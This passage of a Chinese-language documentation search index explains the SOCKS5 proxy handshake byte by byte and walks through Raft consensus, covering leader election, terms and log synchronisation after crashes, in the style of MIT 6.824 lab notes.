Message\u53d1\u9001\u7ed9\u670d\u52a1\u7aef\u7528\u4e8e\u6570\u636e\u4e0e\u63e1\u624b\u9a8c\u8bc1\u3002\u670d\u52a1\u7aef\u4e5f\u505a\u7c7b\u4f3c\u7684\u4e8b\u60c5\uff0c\u4e4b\u540e\u8fc7\u7a0b\u5c31\u548cHTTP\u4e00\u6837\u4e86\u3002</p> <p>\u4ee5\u4e0a\u662f\u5927\u591a\u6570\u7684\u573a\u666f\uff0c\u53ea\u9700\u5355\u5411\u8ba4\u8bc1\u3002\u5728\u4e00\u4e9b\u7279\u6b8a\u573a\u5408\uff0c\u6709\u66f4\u52a0\u4e25\u683c\u8981\u6c42\u65f6\uff0c\u4e5f\u53ef\u80fd\u542f\u52a8\u53cc\u5411\u8ba4\u8bc1\uff0c\u53cc\u65b9\u4e92\u76f8\u9a8c\u8bc1\u8bc1\u4e66\u3002</p>"},{"location":"other/protocol/#socks5","title":"SOCKS5","text":"<p>SOCKS5\u662fTCP/IP\u5c42\u9762\u7684\u7f51\u7edc\u4ee3\u7406\u534f\u8bae\uff0cShadowSocks\u7684\u6570\u636e\u4f20\u8f93\u5c31\u662f\u5efa\u7acb\u5728SOCKS5\u534f\u8bae\u4e4b\u4e0a\u7684\u3002</p> <p>\u5b83\u7684\u672c\u8d28\u5c31\u662f\u628a\u539f\u672c\u5e94\u8be5\u518d\u672c\u673a\u76f4\u63a5\u8bf7\u6c42\u76ee\u6807\u670d\u52a1\u5668\u7684\u6d41\u7a0b\uff0c\u653e\u5230\u4e86\u670d\u52a1\u7aef\u53bb\u4ee3\u7406\u5ba2\u670d\u7aef\u8bf7\u6c42\u3002\u8fd0\u884c\u6d41\u7a0b\u53ef\u4ee5\u603b\u7ed3\u4e3a:</p> <ol> <li>\u672c\u673a\u548c\u4ee3\u7406\u670d\u52a1\u7aef\u534f\u5546\u5e76\u5efa\u7acb\u8fde\u63a5</li> <li>\u672c\u673a\u544a\u8bc9\u4ee3\u7406\u670d\u52a1\u7aef\u76ee\u6807\u670d\u52a1\u5668\u7684\u5730\u5740</li> <li>\u4ee3\u7406\u670d\u52a1\u7aef\u53bb\u8fde\u63a5\u76ee\u6807\u670d\u52a1\u5668\uff0c\u6210\u529f\u540e\u544a\u8bc9\u672c\u673a</li> <li>\u672c\u673a\u5f00\u59cb\u53d1\u9001\u539f\u672c\u5e94\u8be5\u53d1\u9001\u7ed9\u76ee\u6807\u670d\u52a1\u5668\u7684\u6570\u636e\uff0c\u7531\u4ee3\u7406\u670d\u52a1\u7aef\u5b8c\u6210\u6570\u636e\u8f6c\u53d1</li> </ol>"},{"location":"other/protocol/#_21","title":"\u5efa\u7acb\u8fde\u63a5","text":"<p>\u5ba2\u6237\u7aef\u5411\u4ee3\u7406\u670d\u52a1\u7aef\u8bf7\u6c42\u5efa\u7acb\u8fde\u63a5\uff0c\u5176\u53d1\u9001\u7684\u6570\u636e\u5305\u4e3a:</p> VER NMMETHODS METHODS 0x05 0x02 0x0002 <ul> <li>VER\u8868\u793aSOCKS\u7684\u7248\u672c\uff0cSOCKS5\u5e94\u8be5\u4e3a0x05\uff0c\u8be5\u5b57\u6bb5\u957f\u5ea6\u56fa\u5b9a1\u5b57\u8282</li> <li>NMMETHODS\u8868\u793a\u5176\u540e\u7684METHODS\u6709\u591a\u957f\uff0c\u8be5\u5b57\u6bb5\u957f\u5ea6\u56fa\u5b9a1\u5b57\u8282</li> <li>METHODS\u8868\u793a\u5ba2\u6237\u7aef\u652f\u6301\u7684\u9a8c\u8bc1\u7684\u65b9\u5f0f\uff0c\u53ef\u4ee5\u662f\u591a\u79cd\u65b9\u5f0f\uff0c\u59820x00\u8868\u793a\u4e0d\u9700\u8981\u9a8c\u8bc1\u30010x02\u8868\u793a\u8d26\u53f7\u5bc6\u7801\u9a8c\u8bc1\uff0c\u5176\u957f\u5ea6\u4e3a1~255\u5b57\u8282</li> </ul>"},{"location":"other/protocol/#_22","title":"\u54cd\u5e94\u8fde\u63a5","text":"<p>\u4ee3\u7406\u670d\u52a1\u7aef\u6536\u5230\u5ba2\u6237\u7aef\u7684\u8bf7\u6c42\u540e\uff0c\u9700\u8981\u8fd4\u56de\u8981\u6c42\u5ba2\u6237\u7aef\u63d0\u4f9b\u54ea\u79cd\u9a8c\u8bc1\u65b9\u5f0f\u7684\u4fe1\u606f\uff0c\u4f8b\u5982\u5b83\u9700\u8981\u5ba2\u6237\u7aef\u63d0\u4f9b\u8d26\u5bc6\u9a8c\u8bc1\u4fe1\u606f\u5c31\u4f1a\u8fd9\u6837\u8fd4\u56de:</p> VER METHOD 0x05 0x02"},{"location":"other/protocol/#_23","title":"\u548c\u76ee\u6807\u670d\u52a1\u5efa\u7acb\u8fde\u63a5","text":"<p>\u7531\u4e8e\u6bcf\u79cd\u9a8c\u8bc1\u65b9\u5f0f\u9700\u8981\u53d1\u9001\u7684\u4fe1\u606f\u4e0d\u540c\uff0c\u4e3a\u7b80\u5355\u8d77\u89c1\uff0c\u5047\u8bbe\u4ee3\u7406\u670d\u52a1\u7aef\u662f\u4e0d\u9700\u8981\u9a8c\u8bc1\u7684\uff0c\u90a3\u4e48\u4e0b\u4e00\u6b65\u5ba2\u6237\u7aef\u5c31\u8981\u544a\u8bc9\u4ee3\u7406\u670d\u52a1\u7aef\u76ee\u6807\u670d\u52a1\u7684\u5730\u5740\u4e86\u3002\u4e5f\u5c31\u662f\u8bf4\u5ba2\u6237\u7aef\u9700\u8981\u628a\u5982Google\u670d\u52a1\u7684\u5730\u5740google.com:80\u544a\u8bc9\u4ee3\u7406\u670d\u52a1\u7aef\uff0c\u4ee3\u7406\u670d\u52a1\u7aef\u518d\u53bb\u8bf7\u6c42google.com:80\u3002\u6b64\u65f6\uff0c\u5ba2\u6237\u7aef\u53d1\u9001\u7684\u4fe1\u606f\u5982\u4e0b:</p> VER CMD RSV ATYP DST.ADDR DST.PORT 0x05 0x01 0x00 0x03 google.com 80 <ul> <li>CMD\u4ee3\u8868\u5ba2\u6237\u7aef\u8bf7\u6c42\u7684\u7c7b\u578b\uff0c\u6709\u4e09\u79cd\uff0c0x01\u5373CONNECT\uff0c0x02\u5373BIND\uff0c0x03\u5373UDP</li> <li>RSV\u4e3a\u4fdd\u7559\u5b57\u6bb5\uff0c\u56fa\u5b9a1\u5b57\u8282\u957f\u5ea6</li> <li>ATYP\u8868\u793a\u76ee\u6807\u670d\u52a1\u7684\u5730\u5740\u7c7b\u578b\uff0c\u6709\u4e09\u79cd\uff0c0x01\u5373IPV4\uff0c0x03\u5373\u57df\u540d\uff0c0x04\u5373IPV6</li> <li>DST.ADDR\u8868\u793a\u76ee\u6807\u670d\u52a1\u5668\u7684\u5730\u5740\uff0c\u6839\u636eATYP\u7684\u7c7b\u578b\u6765\u89e3\u6790\uff0c\u5176\u957f\u5ea6\u4e0d\u786e\u5b9a</li> <li>DST.PORT\u8868\u793a\u8981\u8bbf\u95ee\u76ee\u6807\u670d\u52a1\u5668\u7684\u54ea\u4e2a\u7aef\u53e3\uff0c\u56fa\u5b9a2\u4e2a\u5b57\u8282</li> </ul> <p>\u4ee3\u7406\u670d\u52a1\u7aef\u5f97\u5230\u5ba2\u6237\u7aef\u8981\u8bf7\u6c42\u7684\u76ee\u6807\u670d\u52a1\u5730\u5740\u540e\uff0c\u5c31\u4f1a\u5bf9\u76ee\u6807\u670d\u52a1\u8fdb\u884c\u8bf7\u6c42\uff0c\u65e0\u8bba\u662f\u5426\u6210\u529f\u90fd\u4f1a\u505a\u5982\u4e0b\u8fd4\u56de:</p> VER REP RSV ATYP BND.ADDR BND.PORT 0x05 0x00 0x00 0x03 google.com 80 <ul> <li>REP\u8868\u793a\u54cd\u5e94\u72b6\u6001\u7801\uff0c0x00\u8868\u793a\u6210\u529f\uff0c0x01~0x09\u8868\u793a\u5404\u79cd\u5404\u6837\u7684\u9519\u8bef</li> <li>RSV\u3001ATYP\u548c\u4e4b\u524d\u4e00\u6837</li> <li>BND.ADDR\u8868\u793a\u7ed1\u5b9a\u7684\u5730\u5740</li> <li>BND.PORT\u8868\u793a\u7ed1\u5b9a\u7684\u7aef\u53e3</li> </ul> <p>\u5982\u679c\u54cd\u5e94\u6210\u529f\uff0c\u5ba2\u6237\u7aef\u5c31\u5f00\u59cb\u53d1\u9001\u771f\u5b9e\u6570\u636e\uff0c\u4ee3\u7406\u670d\u52a1\u7aef\u5c31\u5f00\u59cb\u8f6c\u53d1\u8fd9\u4e9b\u6570\u636e\u3002</p>"},{"location":"other/raft/","title":"Raft","text":""},{"location":"other/raft/#_1","title":"\u6982\u8ff0","text":"<p>\u5bf9\u4e8e\u5206\u5e03\u5f0f\u5b58\u50a8\u7cfb\u7edf\uff0c\u901a\u5e38\u4f1a\u901a\u8fc7\u7ef4\u62a4\u591a\u4e2a\u526f\u672c\u6765\u8fdb\u884c\u5bb9\u9519\uff0c\u63d0\u9ad8\u7cfb\u7edf\u7684\u53ef\u7528\u6027\uff0c\u90a3\u4e48\u5c31\u5e26\u6765\u4e00\u4e2a\u95ee\u9898\uff0c\u5982\u4f55\u7ef4\u62a4\u591a\u4e2a\u526f\u672c\u7684\u4e00\u81f4\u6027\uff1fraft\u5c31\u662f\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684\u7b97\u6cd5\u3002</p> <p>\u5728\u4e00\u4e2a\u5177\u6709\u4e00\u81f4\u6027\u3001\u5bb9\u9519\u6027\u7684\u96c6\u7fa4\u4e2d\uff0c\u540c\u4e00\u65f6\u523b\u6240\u6709\u8282\u70b9\u5bf9\u5b58\u50a8\u5728\u5176\u4e2d\u7684\u67d0\u4e2a\u503c\u5e94\u8be5\u6709\u76f8\u540c\u7684\u7ed3\u679c\uff0c\u4e14\u5f53\u5c11\u6570\u8282\u70b9\u5931\u6548\u7684\u65f6\u5019\uff0c\u4e0d\u5f71\u54cd\u96c6\u7fa4\u7684\u6b63\u5e38\u5de5\u4f5c\uff0c\u5f53\u5927\u591a\u6570\u96c6\u7fa4\u4e2d\u7684\u8282\u70b9\u5931\u6548\u7684\u65f6\u5019\uff0c\u96c6\u7fa4\u5219\u4f1a\u505c\u6b62\u670d\u52a1\uff08\u800c\u975e\u8fd4\u56de\u4e00\u4e2a\u9519\u8bef\u7684\u7ed3\u679c\uff09\u3002</p> <p>\u6211\u4eec\u4ee5MIT6.824\u7684lab3\u4e2d\u6784\u5efa\u7684\u5bb9\u9519\u952e\u503c\u670d\u52a1\u4e3a\u4f8b\uff0c\u5927\u6982\u770b\u4e00\u4e0b\u57fa\u4e8eraft\u7b97\u6cd5\u7684\u5de5\u4f5c\u6d41\u7a0b\uff1a</p> <p></p> <p>\u5ba2\u6237\u7aef\u53d1\u9001Put/Get\u547d\u4ee4\u5230\u96c6\u7fa4\u4e2dleader\u7684K/V\u5c42\uff0cleader\u4f1a\u628a\u8fd9\u4e2a\u547d\u4ee4\u5148\u6dfb\u52a0\u5230\u81ea\u5df1\u7684\u65e5\u5fd7\u4e2d\uff0c\u540c\u65f6\u628a\u8fd9\u4e2a\u547d\u4ee4\u901a\u8fc7<code>AppendEntries</code>RPC\u8bf7\u6c42\u53d1\u9001\u7ed9\u81ea\u5df1\u7684follower\uff0c\u5e76\u7b49\u5f85\u7edd\u5927\u591a\u6570follower\u7684\u56de\u590d\u3002\u5982\u679c\u5927\u591a\u6570follower(\u8fd9\u91cc\u4e5f\u9700\u8981\u7b97\u4e0aleader\u81ea\u5df1)\u90fd\u56de\u590d\u65e5\u5fd7\u5df2\u63d0\u4ea4\uff0c\u610f\u5473\u7740\u5373\u4f7f\u5931\u8d25\u4e86\u8fd9\u6761\u65e5\u5fd7\u4e5f\u4e0d\u4f1a\u4e22\u5931\u3002\u90a3\u4e48leader\u5c31\u53bb\u53ef\u4ee5\u6267\u884c\u8fd9\u6761\u547d\u4ee4\uff0c\u5e76\u628a\u6267\u884c\u7ed3\u679c\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\u3002\u5728\u4e0b\u4e00\u6b21leader\u53d1\u9001\u8bf7\u6c42(\u5fc3\u8df3\u6216\u4efb\u610fRPC\u8bf7\u6c42)\u65f6\uff0c\u5b83\u4f1a\u628a\u81ea\u5df1\u5df2\u63d0\u4ea4\u8be5\u65e5\u5fd7(\u4e4b\u524d\u53ea\u662f\u6dfb\u52a0)\u9644\u52a0\u8fdb\u53bb\uff0cfollower\u624d\u77e5\u6653\u5e94\u8be5\u53bb\u6267\u884c\u8fd9\u6761\u547d\u4ee4\u3002</p> <p>\u4e3a\u4ec0\u4e48\u9700\u8981\u65e5\u5fd7\uff1f</p> <p>\u65e5\u5fd7\u670d\u52a1\u662f\u4e3a\u4e86\u4fdd\u6301\u72b6\u6001\u673a(\u4f8b\u5982\u4e0a\u56fe\u4e2d\u7684K/V\u5c42)\u7684\u72b6\u6001\uff1a</p> <ul> <li>\u65e5\u5fd7\u53ef\u4ee5\u8ba9\u6240\u6709\u5ba2\u6237\u7aef\u53d1\u9001\u7684\u547d\u4ee4(\u53ef\u80fd\u6709\u5341\u4e2a\u5ba2\u6237\u7aef\u540c\u65f6\u53d1\u9001\u547d\u4ee4)\u786e\u5b9a\u4e00\u4e2a\u987a\u5e8f\uff0c\u4f7f\u5f97\u5404\u4e2afollower\u7684\u6267\u884c\u90fd\u662f\u7edf\u4e00\u7684\u987a\u5e8f\uff0c\u540c\u65f6\u4e5f\u4f7f\u5f97leader\u80fd\u591f\u786e\u8ba4\u5404\u4e2afollower\u6709\u76f8\u540c\u7684\u65e5\u5fd7  </li> <li>follower\u9700\u8981\u65e5\u5fd7\u6765\u4e34\u65f6\u5b58\u50a8\u4e00\u6761\u4e34\u65f6\u7684\u547d\u4ee4\uff0c\u5b83\u5e76\u4e0d\u77e5\u9053\u662f\u5426\u5e94\u8be5\u6267\u884c\uff0c\u76f4\u5230\u5b83\u6536\u5230leader\u547d\u4ee4\u5df2\u63d0\u4ea4  </li> <li>\u6709\u65f6\u5019\u4f1a\u9047\u5230follower\u63a5\u6536\u4e0d\u5230\u6d88\u606f\u3001\u7f51\u7edc\u4e0d\u7545\u7b49\u60c5\u51b5\uff0c\u65e5\u5fd7\u53ef\u4ee5\u5e2e\u52a9leader\u91cd\u65b0\u53d1\u9001  </li> <li>\u5f53\u6709\u670d\u52a1\u5668crash\u3001\u6389\u7ebf\u3001\u91cd\u542f\u6216\u8005\u6709\u4e00\u4e2a\u65b0\u7684\u670d\u52a1\u5668\u52a0\u5165\u65f6\uff0c\u65e5\u5fd7\u53ef\u4ee5\u5e2e\u52a9\u5b83\u91cd\u65b0\u6267\u884c\u4e00\u6b21\u5b8c\u6574\u7684\u547d\u4ee4  </li> </ul>"},{"location":"other/raft/#leader","title":"leader\u9009\u4e3e","text":"<p> raft\u8282\u70b9\u662f\u5728\u5982\u56fe\u6240\u793a\u7684\u4e09\u79cd\u72b6\u6001\u4e2d\u53d8\u6362\u7684\uff0c\u4f46\u5728\u4e00\u4e2a\u5178\u578b\u7684\u7a33\u6001\u573a\u666f\u4e2d\uff0c\u96c6\u7fa4\u53ea\u6709\u4e00\u4e2aleader\uff0c\u5176\u4ed6\u90fd\u662ffollower\u3002\u5c3d\u7ba1\u6211\u4eec\u5e0c\u671b\u7cfb\u7edf\u4e00\u76f4\u662f\u8fd9\u6837\u7a33\u6001\u7684\u8fd0\u884c\u4e0b\u53bb\u7684\uff0c\u4f46\u662fraft\u534f\u8bae\u7684\u76ee\u6807\u5c31\u662f\u5bb9\u9519\u3002\u56e0\u6b64\uff0c\u4f1a\u82b1\u8d39\u5927\u91cf\u7684\u65f6\u95f4\u6765\u7814\u7a76\u4e00\u4e9b\u975e\u5178\u578b\u7684\u6545\u969c\u573a\u666f\uff0c\u5982\u90e8\u5206\u670d\u52a1\u5668\u5d29\u6e83\u6216\u8005\u65ad\u5f00\u8fde\u63a5\u7b49\u60c5\u51b5\u3002</p> <p>\u4e3a\u4ec0\u4e48\u9700\u8981\u4e00\u4e2aleader\uff1f \u5728\u4e00\u4e9b\u5176\u4ed6\u7684\u96c6\u7fa4\u4e00\u81f4\u6027\u7b97\u6cd5\u8bbe\u8ba1\u4e2d\uff0c\u662f\u53ef\u4ee5\u4e0d\u9700\u8981leader\u7684\uff0c\u4f8b\u5982Paxos\u3002\u4f46leader\u53ef\u4ee5\u8ba9raft\u66f4\u9ad8\u6548\uff0c\u6bcf\u4e2afollower\u90fd\u77e5\u9053\u8c01\u662fleader\uff0c\u7ecf\u8fc7\u4e00\u8f6e\u6d88\u606f\u7684\u4f20\u9012\u5c31\u53ef\u4ee5\u5904\u7406\u4e00\u4e2a\u4e8b\u4ef6\u3002\u6548\u7387\u662f\u6700\u91cd\u8981\u7684\u539f\u56e0\uff0c\u6b64\u5916\u4e5f\u6709\u5229\u4e8e\u7406\u89e3\u7b49\u5176\u4ed6\u539f\u56e0\u3002</p> <p>Raft\u7f16\u6392leader\u7684\u987a\u5e8f \u6bcf\u5f53\u6709\u4e00\u4e2a\u65b0\u7684leader\u9009\u4e3e\u51fa\uff0c\u5c31\u4f1a\u6709\u4e00\u4e2a\u65b0\u7684term\u4efb\u671f\u3002\u5728\u4e00\u4e2a\u4efb\u671f\u5185\uff0c\u6700\u591a\u53ea\u4f1a\u6709\u4e00\u4e2aleader\uff0c\u6216\u8005\u6ca1\u6709\u3002\u8fd9\u4e2aterm\u7684\u503c\u8ba9\u96c6\u7fa4\u5185\u7684\u670d\u52a1\u5668\u77e5\u6653\u8c01\u662f\u5f53\u524d\u7684leader\uff0c\u800c\u4e0d\u4f1a\u53bb\u8ddf\u968f\u4e00\u4e2a\u88ab\u53d6\u4ee3\u4e86\u7684leader\u3002</p> <p>\u4ec0\u4e48\u65f6\u5019\u5f00\u59cb\u4e00\u8f6e\u65b0\u7684\u9009\u4e3e\uff1f \u6bcf\u4e2a\u8282\u70b9\u90fd\u6709\u4e00\u4e2a<code>Election Timer</code>\u5012\u8ba1\u65f6(\u6bcf\u6b21\u6536\u5230\u6d88\u606f\uff0c\u91cd\u7f6e\u8be5\u65f6\u95f4)\uff0c\u5012\u8ba1\u65f6\u5185\u6ca1\u6709\u6536\u5230\u4efb\u4f55\u6d88\u606f\u65f6\uff0c\u5b83\u5c31\u4f1a\u53d1\u8d77\u4e00\u8f6e\u9009\u4e3e\uff0c\u5f53\u524d\u7684\u4efb\u671f+1\u3001\u5411\u5176\u4ed6\u8282\u70b9\u53d1\u51fa\u6295\u7968\u8bf7\u6c42\u3002\u6b64\u65f6\uff0c\u53ef\u80fd\u662f\u5b83\u81ea\u5df1\u6389\u7ebf\uff0c\u4ea7\u751f\u4e86\u4e00\u4e2a\u6ca1\u6709\u610f\u4e49\u7684\u9009\u4e3e\uff0c\u4e5f\u53ef\u80fd\u662f\u65e7\u7684leader\u6389\u7ebf\u4e86\u3002</p> <p>\u5982\u4f55\u786e\u4fdd\u6bcf\u4e2aterm\u81f3\u591a\u53ea\u6709\u4e00\u4e2aleader\uff1f \u9996\u5148\uff0c\u5fc5\u987b\u83b7\u5f97\u96c6\u7fa4\u4e2d\u5927\u591a\u6570\u8282\u70b9\u7684\u9009\u7968\u624d\u80fd\u6210\u4e3aleader\u3002\u5176\u6b21\uff0c\u6bcf\u4e2a\u8282\u70b9\u5728\u5f53\u524d\u7684term\u4e2d\u53ea\u80fd\u8fdb\u884c\u4e00\u6b21\u6295\u7968\uff0c\u5982\u679c\u5b83\u81ea\u5df1\u6210\u4e3a\u4e86\u5019\u9009\u4eba\uff0c\u5b83\u5c31\u6295\u7ed9\u81ea\u5df1\uff1b\u5982\u679c\u4e0d\u662f\uff0c\u5b83\u5c31\u6295\u7ed9\u7b2c\u4e00\u4e2a\u53d1\u9001\u7ed9\u5b83\u6295\u7968\u8bf7\u6c42\u7684\u8282\u70b9\u3002\u6240\u4ee5\u6bcf\u4e2a\u4efb\u671f\u5185\uff0c\u4e5f\u81f3\u591a\u53ea\u6709\u4e00\u4e2a\u8282\u70b9\u80fd\u5f97\u5230\u5927\u591a\u6570\u5176\u4ed6\u8282\u70b9\u7684\u9009\u7968\uff0c\u5373\u4f7f\u5728\u53d1\u751f\u7f51\u7edc\u5206\u88c2\u3001\u90e8\u5206\u670d\u52a1\u8282\u70b9\u6389\u7ebf\u7684\u60c5\u51b5\u4e0b\u3002</p> <p>\u5176\u4ed6\u8282\u70b9\u5982\u4f55\u77e5\u6653\u4e00\u4e2a\u65b0\u7684leader\u662f\u8c01\uff1f \u5bf9\u4e8e\u65b0leader\u81ea\u5df1\uff0c\u5b83\u83b7\u5f97\u4e86\u8fc7\u534a\u7684\u9009\u7968\uff0c\u81ea\u7136\u77e5\u9053\u81ea\u5df1\u5df2\u7ecf\u9009\u4e3e\u6210\u529f\uff0c\u4f46\u662f\u5176\u4ed6leader\u662f\u4e0d\u77e5\u9053\u8fd9\u70b9\u7684\u3002\u53ea\u6709leader\u80fd\u53d1\u51fa<code>AppendEntries</code>RPC\u8bf7\u6c42\uff0c\u5f53follower\u6536\u5230\u4e00\u4e2a\u66f4\u9ad8term\u7684\u8be5\u8bf7\u6c42\u65f6\uff0c\u5b83\u4eec\u77e5\u9053\u65b0\u7684leader\u5df2\u7ecf\u4ea7\u751f\uff0c\u4e0d\u9700\u8981\u5728\u8fdb\u884c\u4e0b\u4e00\u8f6e\u7684\u9009\u4e3e\u3002</p> <p>\u9009\u4e3e\u5931\u8d25 \u9009\u4e3e\u5931\u8d25\u53ea\u6709\u4e24\u79cd\u60c5\u51b5\uff0c\u5176\u4e00\u662f\u5927\u90e8\u5206\u8282\u70b9\u7684\u6389\u7ebf\u5bfc\u81f4\u4e0d\u80fd\u62ff\u5230\u5927\u591a\u6570\u7684\u9009\u7968\uff1b\u5176\u4e8c\u662f\u591a\u4e2a\u5019\u9009\u4eba\u540c\u65f6\u6295\u7968\uff0c\u4f7f\u5f97\u6ca1\u6709\u4eba\u80fd\u83b7\u5f97\u5927\u591a\u6570\u9009\u7968\u3002\u53d1\u751f\u5931\u8d25\u4ee5\u540e\uff0c\u5176\u5b9e\u8fd8\u662f\u4f1a\u5bfc\u81f4<code>Election Timer</code>\u8d85\u65f6\uff0c\u4ece\u800cterm+1\uff0c\u4ea7\u751f\u65b0\u7684\u4e00\u8f6e\u9009\u4e3e\u3002</p> <p>\u5982\u4f55\u907f\u514d\u6295\u7968\u7684\u5206\u6563\uff1f \u6bcf\u4e2a\u8282\u70b9\u4f1a\u9009\u62e9\u4e00\u4e2a\u968f\u673a\u7684\u9009\u4e3e\u8d85\u65f6\uff0c\u8c01\u7684\u65f6\u95f4\u5148\u5230\u8c01\u5c31\u4f1a\u5148\u53bb\u53d1\u8d77\u6295\u7968\u8bf7\u6c42\uff0c\u63a5\u6536\u5230\u8bf7\u6c42\u7684\u8282\u70b9\u5c31\u4f1a\u53d8\u6210follower\u3002\u8fd9\u79cd\u901a\u8fc7\u968f\u673a\u5ef6\u65f6\u7684\u65b9\u5f0f\u5728\u7f51\u7edc\u534f\u8bae\u4e2d\u662f\u5f88\u5e38\u89c1\u7684\u3002</p> <p>\u5982\u4f55\u9009\u62e9\u5408\u9002\u7684\u9009\u4e3e\u8d85\u65f6\u65f6\u95f4\uff1f \u8fd9\u4e2a\u65f6\u95f4\u4e0d\u80fd\u592a\u77ed\uff0c\u81f3\u5c11\u5e94\u8be5\u662f\u51e0\u500d\u4e8e\u5fc3\u8df3\u8d85\u65f6\u65f6\u95f4\uff0c\u8fd9\u6837\u5982\u679c\u7f51\u7edc\u4e2d\u5076\u6709\u4e22\u5305\u7684\u8bdd\uff0c\u53ef\u4ee5\u907f\u514d\u4e0d\u5fc5\u8981\u7684\u9009\u4e3e\u3002\u4e5f\u9700\u8981\u8db3\u591f\u957f\u7684\u65f6\u95f4\u8ba9\u5019\u9009\u4eba\u5728\u4e0b\u4e00\u8f6e\u9009\u4e3e\u5f00\u59cb\u524d\u8ba1\u7b97\u51fa\u81ea\u5df1\u662f\u5426\u9009\u4e3e\u6210\u529f\u3002\u4e5f\u4e0d\u80fd\u592a\u957f\uff0c\u56e0\u4e3a\u5728\u8fd9\u4e2a\u65f6\u95f4\u6bb5\uff0c\u6574\u4e2a\u7cfb\u7edf\u662f\u6ca1\u6709leader\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u662f\u5904\u4e8e\u51bb\u7ed3\u72b6\u6001\u65e0\u6cd5\u54cd\u5e94\u5ba2\u6237\u7aef\u7684\u3002</p> <p>\u65e7\u7684leader\u4e0d\u77e5\u9053\u65b0\u7684leader\u88ab\u9009\u4e3e\u51fa\u600e\u4e48\u529e\uff1f \u4e5f\u8bb8\u662f\u7531\u4e8e\u7f51\u7edc\u6ce2\u52a8\uff0c\u65e7\u7684leader\u548c\u5c11\u90e8\u5206\u8282\u70b9\u7684\u7f51\u7edc\u5728\u5904\u7406\u4e00\u90e8\u5206\u5ba2\u6237\u7aef\u8bf7\u6c42\uff0c\u65b0\u7684leader\u548c\u5927\u90e8\u5206\u8282\u70b9\u7684\u7f51\u7edc\u5728\u5904\u7406\u4e00\u90e8\u5206\u5ba2\u6237\u7aef\u8bf7\u6c42\uff0c\u65e7\u7684leader\u5e76\u4e0d\u77e5\u9053\u65b0\u7684leader\u4ea7\u751f\uff0c\u8fd9\u96be\u9053\u4e0d\u4f1a\u9020\u6210\u65e7\u7684leader\u9519\u8bef\u7684\u6267\u884c\uff1f \u65e7\u7684leader\u53d1\u51fa\u7684<code>AppendEntries</code>RPC\u8bf7\u6c42\u53ea\u4f1a\u8ba9\u5c11\u90e8\u5206\u8282\u70b9\u6536\u5230\uff0c\u90a3\u4e48\u5b83\u5c31\u4e0d\u4f1a\u53bb\u63d0\u4ea4\u4efb\u4f55\u65b0\u7684\u65e5\u5fd7\u9879\u76ee\uff0c\u4e5f\u5c31\u4e0d\u4f1a\u53bb\u6267\u884c\u547d\u4ee4\u5e76\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\u3002</p>"},{"location":"other/raft/#_2","title":"\u65e5\u5fd7","text":"<p>\u53ea\u8981leader\u5b58\u5728\uff0c\u5ba2\u6237\u7aef\u53ea\u80fd\u548cleader\u4ea4\u4e92\uff0c\u800c\u65e0\u6cd5\u770b\u5230\u4efb\u4f55follower\u7684\u72b6\u6001\u6216\u65e5\u5fd7\u3002\u90a3\u4e48\u5f53leader\u66f4\u66ff\u65f6\uff0c\u4f1a\u4e0d\u4f1a\u51fa\u73b0\u4e00\u4e9b\u5f02\u5e38\uff1f\u6bd4\u5982\u8bf4\u5b58\u5728\u4e24\u4e2a\u4e0d\u540c\u7684\u526f\u672c\uff0c\u4e22\u5931\u4e00\u4e9b\u64cd\u4f5c\uff0c\u91cd\u590d\u4e00\u4e9b\u64cd\u4f5c\u7b49\u7b49\u3002</p> <p>\u5728\u53d1\u751fcrash\u540e\u65e5\u5fd7\u662f\u5982\u4f55\u540c\u6b65\u7684\uff1f \u5047\u8bbe\u6709\u4e09\u4e2a\u8282\u70b9\uff0c\u5728\u67d0\u6b21s3(leader)\u8fd8\u6ca1\u6709\u53d1\u9001\u5b8c<code>AppendEntries</code>\u65f6crash\u4e86\uff0c\u90a3\u4e48\u5b83\u4eec\u7684\u65e5\u5fd7\u60c5\u51b5\u53ef\u80fd\u662f\u8fd9\u6837\u7684: <pre><code>S1: 3\nS2: 3 3\nS3: 3 3\n</code></pre> \u4e4b\u540e\uff0cs2\u5728term4\u88ab\u9009\u4e3e\u4e3aleader\u5e76\u63a5\u6536\u5230\u4e00\u4e2a\u5ba2\u6237\u7aef\u8bf7\u6c42\u6dfb\u52a0\u4e86\u4e00\u6761\u65e5\u5fd7\u540ecrash\uff0cs3\u5728term5\u53d1\u751f\u4e86\u540c\u6837\u7684\u4e8b\u60c5\uff0c\u4f1a\u5f62\u6210\u8fd9\u79cd\u60c5\u51b5: <pre><code>    10 11 12 13  &lt;- log entry #  \nS1:  3  \nS2:  3  3  4  \nS3:  3  3  5  \n</code></pre> \u6b64\u65f6\uff0cs3\u5728term6\u88ab\u9009\u4e3e\u4e3aleader\uff0c\u5b83\u5982\u4f55\u540c\u6b65follower\u7684\u65e5\u5fd7\uff1f</p> <p>s3\u4e0b\u6b21\u53d1\u51fa\u7684<code>AppendEntries</code>\u8bf7\u6c42\u4f1a\u5305\u542b<code>prevLogIndex=12, prevLogTerm=5, Entries=[log6]</code>\uff0cs2\u63a5\u6536\u5230\u8bf7\u6c42\u4ee5\u540e\u53d1\u73b0prevLogTerm\u4e0d\u5339\u914d\uff0c\u8fd4\u56defalse\uff0c\u540c\u6837s1\u4e5f\u8fd4\u56defalse\u3002s3\u6536\u5230\u8fd4\u56de\u540e\uff0c\u5176nextIndex[s2]\u548cnextIndex[s1]\u7684\u503c\u5747\u51cf1\u53d8\u4e3a12\uff0c\u4e0b\u6b21\u53d1\u51fa\u7684\u8bf7\u6c42\u5305\u542b<code>prevLogIndex=11, prevLogTerm=3, Entries=[log5, log6]</code>\uff0cs2\u4f1a\u63a5\u53d7\u8fd9\u4e2a\u8bf7\u6c42\u4ee5\u53ca\u76f8\u5e94\u7684\u65e5\u5fd7\uff0c\u5220\u6389\u81ea\u5df1index12\u4e0a\u7684log\uff0c\u5e76\u8fd4\u56detrue\u3002\u540c\u7406\uff0cs1\u6700\u7ec8\u4e5f\u4f1a\u5728\u4e0b\u4e00\u6b21\u8bf7\u6c42\u4e2d\u5f97\u5230\u540c\u6b65\u3002\u6700\u7ec8\u6240\u6709\u8282\u70b9\u7684\u65e5\u5fd7\u5f97\u5230\u540c\u6b65\uff0cnextIndex[s2]\u548cnextIndex[s1]\u7684\u503c\u53d8\u4e3a14\u3002</p> 